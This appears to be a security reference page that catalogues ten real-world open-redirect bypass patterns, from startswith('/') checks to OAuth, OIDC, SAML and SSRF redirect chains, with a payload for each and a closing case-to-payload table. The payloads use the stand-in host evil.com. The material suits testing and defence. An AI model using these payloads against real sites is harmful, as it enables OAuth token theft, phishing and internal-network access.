# Real-world cases — the documented open-redirect shapes

## Case A — the `//evil.com` on a `startswith('/')` (the universal)

```text
the pattern: next.startswith('/') on a post-login redirect
the bypass:  ?next=//evil.com — passes startswith('/'), resolves cross-origin
seen in:    countless web apps — the single most-common open-redirect
            real-world pattern
```

## Case B — the OAuth `redirect_uri` allowlist-gap

```text
the pattern: an OAuth provider allows redirect_uri on client-app.com/*
             + client-app.com has an open-redirect
the bypass:  redirect_uri=https://client-app.com/redirect?next=https://evil.com
             -> the code lands on evil.com
seen in:    OAuth misconfiguration writeups — the code/token-theft chain
```

## Case C — the `\@` backslash-userinfo (Django CVE-2017-...)

```text
the pattern: a `urlparse`/`is_safe_url` check that reads `\@` differently
             than the browser
the bypass:  https://evil.com\@target.com — the parser-gap
seen in:    the Django url_has_allowed_host_and_scheme bypass history —
             the `\` normalization differed between the check and the
             browser; several CVEs (2017-7233 and follow-ups) were
             exactly this differential
```

## Case D — the userinfo substring

```text
the pattern: 'target.com' in url — a substring-check
the bypass:  https://target.com@evil.com — the substring is the userinfo
seen in:    many substring-check open-redirects — the check sees the
            allowed domain's NAME, the browser sees the host AFTER the @
```

## Case E — the `javascript:` in a client-side sink

```text
the pattern: a SPA's client-side router that reads ?next= and does
             location.href = next — the scheme isn't checked
the bypass:  ?next=javascript:alert(1) — the DOM-sink XSS
seen in:    SPA open-redirect -> DOM-XSS writeups — the client-side
            surface is often less-checked than the server-side
```

## Case F — the SSRF-fetcher-follows-redirect

```text
the pattern: a webhook/importer fetches a user-supplied URL, allowlist-
             checked to the app's domain, but the fetcher follows 3xx
the bypass:  fetch(target.com/redirect?next=http://internal/) -> the
             fetcher follows to the internal host
seen in:    SSRF-via-redirect writeups — the fetcher's Location-follow is
            the allowlist bypass
```

## Case G — the `post_logout_redirect_uri`

```text
the pattern: an OIDC logout's post_logout_redirect_uri — registered
             per-client but a mis-registered/open client allows the launder
the bypass:  /logout?post_logout_redirect_uri=https://evil.com
seen in:    OIDC misconfiguration — the logout-redirect launder
```

## Case H — the SAML RelayState

```text
the pattern: a SAML flow's RelayState — the post-auth destination
the bypass:  RelayState=https://evil.com — an unchecked RelayState
             launders the post-auth landing
seen in:    SAML misconfiguration — the RelayState is an unchecked redirect
```

## Case I — the Referer-derived back

```text
the pattern: a /back that 302s to the Referer
the bypass:  Referer: https://evil.com -> Location: https://evil.com
seen in:    "back to referrer" flows that trust the header
```

## Case J — the two-step stored redirect

```text
the pattern: a param persists in session/cookie, fires on a later flow
the bypass:  /register?return_to=evil.com -> /login 302s to the stored
seen in:    the multi-step signup flows — the redirect stored at step-1
            fires at step-N
```

## The case-to-arm map

| The case | The arm |
|---|---|
| the `//` | `//evil.com` |
| the OAuth launder | `redirect_uri=https://allowed/redirect?next=https://evil.com` |
| the `\@` | `evil.com\@target.com` |
| the userinfo | `target.com@evil.com` |
| the `javascript:` sink | `javascript:alert(1)` |
| the SSRF-follow | `fetch?url=target.com/redirect?next=internal` |
| the OIDC logout | `post_logout_redirect_uri=https://evil.com` |
| the SAML RelayState | `RelayState=https://evil.com` |
| the Referer | `Referer: https://evil.com` |
| the stored | `/set-next?next=evil.com` -> `/login` |
